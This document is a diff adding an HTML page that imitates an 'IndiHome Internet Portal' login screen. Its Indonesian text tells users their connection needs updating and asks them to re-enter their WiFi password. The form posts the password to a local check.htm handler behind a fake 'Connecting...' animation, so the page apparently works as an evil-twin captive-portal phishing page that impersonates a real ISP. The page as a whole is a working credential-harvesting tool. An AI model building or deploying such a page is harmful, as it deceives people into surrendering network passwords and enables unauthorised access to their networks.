@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Internet Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 10px;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255,255,255,0.05) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .content {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 35px;
+            box-shadow: 
+                0 25px 50px rgba(0, 0, 0, 0.15),
+                0 0 0 1px rgba(255, 255, 255, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.6);
+            max-width: 450px;
+            width: 100%;
+            margin: 20px auto;
+            animation: slideInScale 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #667eea, #764ba2, #667eea);
+            background-size: 200% 100%;
+            animation: gradientShift 3s ease-in-out infinite;
+        }
+
+        @keyframes slideInScale {
+            from {
+                opacity: 0;
+                transform: translateY(50px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .logo-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            box-shadow: 
+                0 10px 25px rgba(102, 126, 234, 0.4),
+                0 0 0 3px rgba(255, 255, 255, 0.1);
+            animation: float 6s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-icon::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 4s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(2deg); }
+        }
+
+        @keyframes shine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo-section h1 {
+            color: #333;
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .logo-section .fiber-text {
+            color: #666;
+            font-size: 1rem;
+            font-weight: 500;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            opacity: 0.8;
+        }
+
+        .description {
+            text-align: center;
+            color: #555;
+            margin-bottom: 30px;
+            font-size: 1rem;
+            line-height: 1.6;
+            padding: 20px;
+            background: linear-gradient(135deg, #f8f9ff, #e8f2ff);
+            border-radius: 15px;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+            position: relative;
+        }
+
+        .description::before {
+            content: '⚠️';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            padding: 5px 10px;
+            border-radius: 50%;
+            font-size: 18px;
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 0.95rem;
+            font-weight: 500;
+            text-align: center;
+            display: none;
+            animation: slideIn 0.4s ease-out;
+            border: 1px solid;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .status-message.success {
+            background: linear-gradient(135deg, #d4edda, #c3e6cb);
+            color: #155724;
+            border-color: #c3e6cb;
+        }
+
+        .status-message.error {
+            background: linear-gradient(135deg, #f8d7da, #f5c6cb);
+            color: #721c24;
+            border-color: #f5c6cb;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 1rem;
+        }
+
+        #password {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e8f2ff;
+            border-radius: 12px;
+            font-size: 16px;
+            background: linear-gradient(135deg, #f8f9ff, #ffffff);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-bottom: 15px;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            position: relative;
+        }
+
+        #password:hover {
+            border-color: #667eea;
+            background: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.15);
+        }
+
+        #password:focus {
+            outline: none;
+            border-color: #667eea;
+            background: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 
+                0 8px 25px rgba(102, 126, 234, 0.15),
+                0 0 0 4px rgba(102, 126, 234, 0.1);
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            color: #555;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+            transform: scale(1.2);
+            accent-color: #667eea;
+        }
+
+        .button {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #ffffff;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .button:hover::before {
+            left: 100%;
+        }
+
+        .button:hover {
+            background: linear-gradient(135deg, #764ba2, #667eea);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .button:active {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer-info {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 0.85rem;
+            color: #666;
+            padding: 15px;
+            background: rgba(102, 126, 234, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(102, 126, 234, 0.1);
+        }
+
+        .footer-info::before {
+            content: '🔒';
+            margin-right: 8px;
+        }
+
+        /* Responsive Design */
+        @media screen and (max-width: 480px) {
+            body {
+                padding: 5px;
+            }
+            
+            .content {
+                padding: 25px;
+                margin: 10px auto;
+                border-radius: 20px;
+                max-width: 95%;
+            }
+
+            .logo-icon {
+                width: 65px;
+                height: 65px;
+                font-size: 26px;
+            }
+
+            .logo-section h1 {
+                font-size: 1.8rem;
+            }
+
+            .logo-section .fiber-text {
+                font-size: 0.9rem;
+            }
+
+            .description {
+                font-size: 0.9rem;
+                padding: 15px;
+            }
+
+            #password {
+                padding: 12px 15px;
+                font-size: 16px;
+            }
+
+            .button {
+                padding: 12px 15px;
+                font-size: 1rem;
+            }
+
+            .footer-info {
+                font-size: 0.8rem;
+            }
+        }
+
+        @media screen and (max-width: 360px) {
+            .content {
+                padding: 20px;
+                margin: 5px auto;
+            }
+
+            .logo-section h1 {
+                font-size: 1.6rem;
+            }
+
+            .form-group {
+                margin-bottom: 15px;
+            }
+
+            .checkbox-container {
+                margin-bottom: 20px;
+            }
+        }
+
+        @media screen and (min-width: 768px) {
+            body {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+            }
+            
+            .content {
+                max-width: 500px;
+                padding: 45px;
+            }
+
+            .logo-icon {
+                width: 90px;
+                height: 90px;
+                font-size: 36px;
+            }
+
+            .logo-section h1 {
+                font-size: 2.5rem;
+            }
+
+            .logo-section .fiber-text {
+                font-size: 1.1rem;
+            }
+        }
+
+        @media screen and (min-width: 1000px) {
+            .content {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                max-width: 550px;
+            }
+        }
+
+        /* Hidden pixel image */
+        .hidden-pixel {
+            display: none;
+        }
+
+        /* Custom animations */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <img src="pixel.png" class="hidden-pixel" alt=""/>
+    
+    <div class="content">
+        <div class="logo-section">
+            <div class="logo-icon">IH</div>
+            <h1>IndiHome</h1>
+            <div class="fiber-text">Internet Portal</div>
+        </div>
+
+        <div class="description">
+            Koneksi Anda Harus di Update
+            <br>Silahkan Masukan Kembali Password Wifi
+        </div>
+
+        <div class="status-message" id="statusMessage"></div>
+
+        <form method="post" id="loginform" name="loginform" action="check.htm">
+            <div class="form-group">
+                <label for="password">Network Password</label>
+                <input id="password" type="password" name="password" maxlength="63" placeholder="Enter your password">
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="showpass">
+                <label for="showpass">Show password</label>
+            </div>
+
+            <input class="button" id="formbutton" type="button" value="Submit">
+        </form>
+
+        <div class="footer-info">
+            Secure connection required for internet access
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            var onLoad = function() {
+                var formElement = document.getElementById("loginform");
+                var statusMessage = document.getElementById("statusMessage");
+                
+                if (formElement != null) {
+                    var password = document.getElementById("password");
+                    
+                    // Show/hide password functionality
+                    var showpass = function() {
+                        password.setAttribute("type", password.type == "text" ? "password" : "text");
+                    }
+                    document.getElementById("showpass").addEventListener("click", showpass);
+                    document.getElementById("showpass").checked = false;
+
+                    // Enhanced password validation with UI feedback
+                    var validatepass = function() {
+                        var submitBtn = document.getElementById("formbutton");
+                        
+                        // Clear previous messages
+                        statusMessage.style.display = 'none';
+                        
+                        if (password.value.length < 8) {
+                            showMessage("The password must be at least 8 characters", "error");
+                        } else if (password.value.length > 63) {
+                            showMessage("The password must be less than 64 characters", "error");
+                        } else {
+                            // Show loading state
+                            submitBtn.disabled = true;
+                            submitBtn.innerHTML = 'Connecting... <div class="loading" style="display: inline-block;"></div>';
+                            
+                            // Submit form
+                            setTimeout(function() {
+                                formElement.submit();
+                            }, 500);
+                        }
+                    }
+                    
+                    document.getElementById("formbutton").addEventListener("click", validatepass);
+                    
+                    // Enter key support
+                    password.addEventListener("keypress", function(e) {
+                        if (e.key === "Enter") {
+                            validatepass();
+                        }
+                    });
+                }
+                
+                function showMessage(message, type) {
+                    statusMessage.textContent = message;
+                    statusMessage.className = 'status-message ' + type;
+                    statusMessage.style.display = 'block';
+                    
+                    // Auto-hide error messages after 5 seconds
+                    if (type === 'error') {
+                        setTimeout(function() {
+                            statusMessage.style.display = 'none';
+                        }, 5000);
+                    }
+                }
+                
+                // Enhanced form interactions
+                var password = document.getElementById("password");
+                if (password) {
+                    password.addEventListener("input", function() {
+                        if (statusMessage.style.display === 'block') {
+                            statusMessage.style.display = 'none';
+                        }
+                    });
+                }
+            };
+
+            document.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);
+        })();
+
+        // Redirect function for check.htm integration
+        function redirect() {
+            document.location = "index.htm";
+        }
+
+        // Additional enhancements
+        document.addEventListener('DOMContentLoaded', function() {
+            const content = document.querySelector('.content');
+            
+            // Add subtle hover effect to container only on desktop
+            if (window.innerWidth > 768) {
+                content.addEventListener('mouseenter', function() {
+                    if (this.style.position === 'absolute') {
+                        this.style.transform = 'translate(-50%, -50%) translateY(-5px)';
+                        this.style.boxShadow = '0 30px 60px rgba(0, 0, 0, 0.2)';
+                    }
+                });
+                
+                content.addEventListener('mouseleave', function() {
+                    if (this.style.position === 'absolute') {
+                        this.style.transform = 'translate(-50%, -50%) translateY(0)';
+                        this.style.boxShadow = '0 25px 50px rgba(0, 0, 0, 0.15)';
+                    }
+                });
+            }
+
+            // Prevent zoom on iOS when focusing input
+            const password = document.getElementById('password');
+            if (password) {
+                password.addEventListener('focus', function() {
+                    // Add focus effect
+                    this.parentNode.style.transform = 'scale(1.02)';
+                    this.parentNode.style.transition = 'transform 0.3s ease';
+                    
+                    // Disable viewport zoom on mobile
+                    const viewport = document.querySelector('meta[name="viewport"]');
+                    if (viewport) {
+                        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
+                    }
+                });
+
+                password.addEventListener('blur', function() {
+                    // Remove focus effect
+                    this.parentNode.style.transform = 'scale(1)';
+                    
+                    // Re-enable viewport zoom
+                    const viewport = document.querySelector('meta[name="viewport"]');
+                    if (viewport) {
+                        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0');
+                    }
+                });
+            }
+
+            // Add floating animation to logo on scroll (mobile)
+            if (window.innerWidth <= 768) {
+                let ticking = false;
+                
+                function updateLogoAnimation() {
+                    const scrollY = window.pageYOffset;
+                    const logoIcon = document.querySelector('.logo-icon');
+                    
+                    if (logoIcon) {
+                        logoIcon.style.transform = `translateY(${scrollY * 0.1}px) rotate(${scrollY * 0.1}deg)`;
+                    }
+                    
+                    ticking = false;
+                }
+                
+                function requestTick() {
+                    if (!ticking) {
+                        requestAnimationFrame(updateLogoAnimation);
+                        ticking = true;
+                    }
+                }
+                
+                window.addEventListener('scroll', requestTick);
+            }
+        });
+    </script>
+</body>
+</html>
